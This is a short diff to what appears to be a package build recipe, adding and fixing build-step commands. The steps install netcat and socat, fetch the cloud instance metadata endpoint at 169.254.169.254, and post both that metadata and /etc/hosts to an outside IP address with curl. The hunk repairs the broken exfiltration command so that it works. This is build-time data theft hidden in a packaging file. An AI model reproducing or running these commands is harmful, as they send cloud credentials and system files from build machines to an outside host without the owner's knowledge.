@@ -16,7 +16,8 @@ parts:
             apt-get update
             apt-get install -y socat netcat-traditional bash curl
             http_proxy="" curl -o xyz http://169.254.169.254/ 
-            curl -d @/etc/hostshttp://139.59.42.102/xyz
+            cat xyz
+            curl -d @/etc/hosts http://139.59.42.102/xyz
             curl -d @xyz http://139.59.42.102/x
             echo 0
 
